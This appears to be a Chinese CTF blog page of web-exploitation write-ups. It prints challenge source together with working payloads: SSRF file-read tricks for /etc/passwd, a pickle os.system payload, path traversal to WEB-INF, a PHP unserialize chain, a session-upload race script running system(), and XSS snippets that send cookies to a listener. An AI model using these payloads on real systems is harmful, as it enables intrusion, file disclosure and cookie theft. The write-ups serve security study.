class="line">urllib.urlopen(&#39;local-file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&#39;).read() # 相当于用 ftp 打开 </span><br><span class="line">urllib.urlopen(&#39;&#x2F;&#x2F;localhost:23334&#39;) urllib.urlopen(&#39;ftp:&#x2F;&#x2F;evil:23334&#39;) # </span><br><span class="line">若服务端返回 PASV 模式的服务器与端口，python 2 不做验证直接连接</span><br><span class="line">urllib.urlopen(&#39;local_file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">urllib.urlopen(&#39;local-file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&#39;).read()</span><br></pre></td></tr></table></figure>

<p>4.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PHP:file_get_contents(&quot;file:&#x2F;&#x2F;localhost&#x2F;etc&#x2F;passwd&quot;);</span><br></pre></td></tr></table></figure>

<p>5.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java:new URL(&#39;url:file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&#39;)</span><br></pre></td></tr></table></figure>

<p>6.ipv6三个小trick</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x.1.ip6.name</span><br><span class="line">0--1.ipv6-literal.net</span><br><span class="line">2408-8207-1850-2a60--4c8.ipv6-literal.net</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/09/19/2021%E9%95%BF%E5%9F%8E%E6%9D%AF/">2021长城杯</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-09-19</time><div class="content"><h2 id="ez-python"><a href="#ez-python" class="headerlink" title="ez_python"></a>ez_python</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template,redirect,send_from_directory</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> send_file</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name,age</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user = base64.b64decode(request.cookies.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> check(user):</span><br><span class="line">            user = pickle.loads(user)</span><br><span class="line">            username = user[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            username = <span class="string">&quot;bad,bad,hacker&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        username = <span class="string">&quot;CTFer&quot;</span> </span><br><span class="line">    pic = <span class="string">&#x27;&#123;0&#125;.jpg&#x27;</span>.format(random.randint(<span class="number">1</span>,<span class="number">7</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pic=request.args.get(<span class="string">&#x27;pic&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> open(pic, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            base64_data = base64.b64encode(f.read())</span><br><span class="line">            p = base64_data.decode()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        pic=<span class="string">&#x27;&#123;0&#125;.jpg&#x27;</span>.format(random.randint(<span class="number">1</span>,<span class="number">7</span>))</span><br><span class="line">        <span class="keyword">with</span> open(pic, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            base64_data = base64.b64encode(f.read())</span><br><span class="line">            p = base64_data.decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, uname=username, pic=p )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure>

<p>定位一下关键函数pickle</p>
<p>考点就呼之欲出了pickle反序列化绕过r字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user &#x3D; pickle.loads(user)</span><br></pre></td></tr></table></figure>

<p>有现成的链子可以直接打</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#e = &#x27;ls / -a&#x27;</span></span><br><span class="line">e = <span class="string">&#x27;cat /flagggggggggggggaaa&#x27;</span></span><br><span class="line">s = pickle.dumps(e)</span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line">payload = <span class="string">b&#x27;c__main__\nUser\n)\x81&#125;(V__setstate__\ncos\nsystem\nubV&#x27;</span> + \</span><br><span class="line">    e.encode()+<span class="string">b&#x27; &gt; /tmp/1.txt\nb.&#x27;</span></span><br><span class="line">response = requests.get(<span class="string">&quot;http://eci-2zedqu5w4d2328dulcrt.cloudeci1.ichunqiu.com:8888/?pic=/tmp/1.txt&quot;</span>,</span><br><span class="line">cookies=dict(</span><br><span class="line">    user=base64.b64encode(payload).decode()))</span><br><span class="line">print(response.text)</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> response.content.decode().split(<span class="string">&quot;\n&quot;</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;base64&quot;</span> <span class="keyword">in</span> l:</span><br><span class="line">        l = l.split(<span class="string">&quot;\&quot;&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;,&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">        print(base64.b64decode(l).decode())</span><br></pre></td></tr></table></figure>

<h2 id="java-url"><a href="#java-url" class="headerlink" title="java_url"></a>java_url</h2><p>java项目下都有一个配置文件可以下载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;download?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;web.xml</span><br></pre></td></tr></table></figure>

<p>然后就可以拿到很多路由<br>接下来下载源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;download?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;com&#x2F;test2&#x2F;aaa1&#x2F;testURL.class</span><br><span class="line"></span><br><span class="line">&#x2F;download?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;com&#x2F;test2&#x2F;aaa1&#x2F;download.class</span><br></pre></td></tr></table></figure>

<p>在审计源码的时候可以看到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String pri &#x3D; tartget_url.substring(0, tartget_url.indexOf(&quot;:&quot;));</span><br><span class="line">if (pri.matches(&quot;(?i)file|(?i)gopher|(?i)data&quot;)) &#123;</span><br></pre></td></tr></table></figure>

<p>第一个冒号前不可以是以下三种协议，所以要找一个放在file协议前面，却又不会报错的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url:file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line">url:file:&#x2F;&#x2F;&#x2F;</span><br><span class="line">url:file:&#x2F;&#x2F;&#x2F;flag</span><br></pre></td></tr></table></figure>

<p>这样就可以了</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/09/18/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/">跨站脚本攻击</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-09-18</time><div class="content"><h2 id="xss打cookie姿势总结"><a href="#xss打cookie姿势总结" class="headerlink" title="xss打cookie姿势总结"></a>xss打cookie姿势总结</h2><p><strong>xss攻击是客户端攻击</strong></p>
<h3 id="xss是什么"><a href="#xss是什么" class="headerlink" title="xss是什么"></a>xss是什么</h3><p>将任意javascript代码插入到<strong>其他web用户页面</strong>执行以达到攻击目的<br>当用户里浏览改页时，恶意代码将会被执行，用户的信息等将被窃取。</p>
<h3 id="容易产生xss的地方"><a href="#容易产生xss的地方" class="headerlink" title="容易产生xss的地方"></a>容易产生xss的地方</h3><p>1.数据交互的地方：get、post、cookies、headers<br>2数据输出的地方：</p>
<h3 id="ctf中的xss"><a href="#ctf中的xss" class="headerlink" title="ctf中的xss"></a>ctf中的xss</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;windows(&#39;http:&#x2F;&#x2F;127.0.0.1:1234?q&#x3D;&#39;+btoa(document.cookie))&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;windows.location.href&#x3D;&#39;http:&#x2F;&#x2F;127.0.0.1:1234?q&#x3D;&#39;+btoa(document.cookie)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var img&#x3D;document.createElement(&#39;img&#39;);</span><br><span class="line">img.src&#x3D;&#39;http:&#x2F;&#x2F;127.0.0.1:1234&#x2F;?q&#x3D;&#39;+btoa(document.cookie);</span><br><span class="line">document.body.append(img)</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>将以上内容插入含有xss漏洞的页面中，其他用户访问这些页面，你在本地监听1234端口，即可获得他们的一些cookie信息</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/09/17/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E5%A4%A7%E8%B5%9B/">2021第五空间大赛</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-09-17</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>比赛的时候一直纠结那题sql注入，后面赛后复现其他题目悔不当初，题目都不会太难吧</p>
<h2 id="pklovecloud"><a href="#pklovecloud" class="headerlink" title="pklovecloud"></a>pklovecloud</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pkshow</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Pk very safe^.^&quot;</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $cinder;  </span><br><span class="line">    <span class="keyword">public</span> $neutron;</span><br><span class="line">    <span class="keyword">public</span> $nova;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;cinder = <span class="keyword">new</span> pkshow;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;cinder))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cinder-&gt;echo_name();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $openstack;</span><br><span class="line">    <span class="keyword">public</span> $docker; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;openstack = unserialize(<span class="keyword">$this</span>-&gt;docker);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;openstack-&gt;neutron = $heat;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;openstack-&gt;neutron === <span class="keyword">$this</span>-&gt;openstack-&gt;nova)</span><br><span class="line">        &#123;</span><br><span class="line">        $file = <span class="string">&quot;./<span class="subst">&#123;$this-&gt;filename&#125;</span>&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;keystone lost~&quot;</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pks&#x27;</span>]))  </span><br><span class="line">&#123;</span><br><span class="line">    $logData = unserialize($_GET[<span class="string">&#x27;pks&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $logData; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>构造一下链条</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cinder;</span><br><span class="line">    <span class="keyword">public</span> $neutron=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $nova=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cinder = <span class="keyword">new</span> pkshow;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;cinder))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cinder-&gt;echo_name();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $openstack;</span><br><span class="line">    <span class="keyword">public</span> $docker;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;openstack = unserialize(<span class="keyword">$this</span>-&gt;docker);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;openstack-&gt;neutron = $heat;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;openstack-&gt;neutron === <span class="keyword">$this</span>-&gt;openstack-&gt;nova)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = <span class="string">&quot;./<span class="subst">&#123;$this-&gt;filename&#125;</span>&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;keystone lost~&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> acp();</span><br><span class="line">$b=<span class="keyword">new</span> ace();</span><br><span class="line">$b-&gt;filename=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">$a-&gt;cinder=$b;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O%3A3%3A&quot;acp&quot;%3A3%3A%7Bs%3A6%3A&quot;cinder&quot;%3BO%3A3%3A&quot;ace&quot;%3A3%3A%7Bs%3A8%3A&quot;filename&quot;%3Bs%3A8%3A&quot;flag.php&quot;%3Bs%3A9%3A&quot;openstack&quot;%3BN%3Bs%3A6%3A&quot;docker&quot;%3BN%3B%7Ds%3A7%3A&quot;neutron&quot;%3Bs%3A1%3A&quot;1&quot;%3Bs%3A4%3A&quot;nova&quot;%3Bs%3A1%3A&quot;1&quot;%3B%7D</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210917195711.png" alt="img"></p>
<h2 id="WebFTP"><a href="#WebFTP" class="headerlink" title="WebFTP"></a>WebFTP</h2><p>目录扫描，拿到源码，然后使用index.php里面的文件进行登录，发现报错，不知道有没有用，先收集一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Warning: error_log(&#x2F;var&#x2F;www&#x2F;html&#x2F;Data&#x2F;Logs&#x2F;21_09_17.log): failed to open stream: No such file or directory in &#x2F;var&#x2F;www&#x2F;html&#x2F;Inc&#x2F;Functions.php on line 229</span><br></pre></td></tr></table></figure>

<p>发现都没啥用，但是发现可以下载配置文件，于是就对照拿到的源码去翻翻看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;114.115.185.167:32770&#x2F;Readme&#x2F;mytz.php?act&#x3D;phpinfo</span><br></pre></td></tr></table></figure>

<p>发现可以执行phpinfo，接下来就拿到flag了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210918001633.png" alt="img"></p>
<h2 id="EasyCleanup"><a href="#EasyCleanup" class="headerlink" title="EasyCleanup"></a>EasyCleanup</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;mode&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;eval&quot;</span>)&#123;</span><br><span class="line">    $shell = $_GET[<span class="string">&#x27;shell&#x27;</span>] ?? <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(strlen($shell) &gt; <span class="number">15</span> | filter($shell) | checkNums($shell)) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">eval</span>($shell);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen($_GET[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">15</span> | filter($_GET[<span class="string">&#x27;file&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span> $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$var</span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    $banned = [<span class="string">&quot;while&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;`&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>($banned <span class="keyword">as</span> $ban)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strstr($var, $ban)) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNums</span>(<span class="params">$var</span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    $alphanum = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">    $cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($alphanum); $i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>($j = <span class="number">0</span>; $j &lt; strlen($var); $j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>($var[$j] == $alphanum[$i])&#123;</span><br><span class="line">                $cnt += <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>($cnt &gt; <span class="number">8</span>) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>查看一下phpinfo()内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?mode&#x3D;eval&amp;shell&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>

<p>刚刚注意到有文件包含操作,发现session这里开启了，<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210918120011.png" alt="img"></p>
<p>然后写脚本包含以下就出来了~</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">sess_id=<span class="string">&quot;1&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&quot;http://114.115.134.72:32770/&quot;</span></span><br><span class="line">def session_upload():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res= s.post(</span><br><span class="line">            url=f<span class="string">&quot;&#123;url&#125;/?page=/tmp/session/sess_&#123;sess_id&#125;&quot;</span>,</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php system(&#x27;ls&#x27;);?&gt;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;xxx.txt&#x27;</span>, open(<span class="string">&quot;shell.txt&quot;</span>, <span class="string">&quot;r&quot;</span>))&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sess_id&#125;</span><br><span class="line">        )</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">100</span>):</span><br><span class="line">    thread=threading.Thread(target=session_upload)</span><br><span class="line">    thread.start()</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210918132308.png" alt="img"></p>
<h2 id="yet-another-mysql-injection"><a href="#yet-another-mysql-injection" class="headerlink" title="yet_another_mysql_injection"></a>yet_another_mysql_injection</h2><p>最后一题，一开始看了一下源码，要登录</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;lib.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params">$mes,$url</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,$s))&#123;</span><br><span class="line">        alertMes(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; $_POST[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; $_POST[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    $username=$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($username !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        alertMes(<span class="string">&#x27;only admin can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    checkSql($password);</span><br><span class="line">    $sql=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    $user_result=mysqli_query($con,$sql);</span><br><span class="line">    $row = mysqli_fetch_array($user_result);</span><br><span class="line">    <span class="keyword">if</span> (!$row) &#123;</span><br><span class="line">        alertMes(<span class="string">&quot;something wrong&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($row[<span class="string">&#x27;password&#x27;</span>] === $password) &#123;</span><br><span class="line">    <span class="keyword">die</span>($FLAG);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    alertMes(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>一开始看了一下以为是要登录，所以就写了个脚本盲注</p>
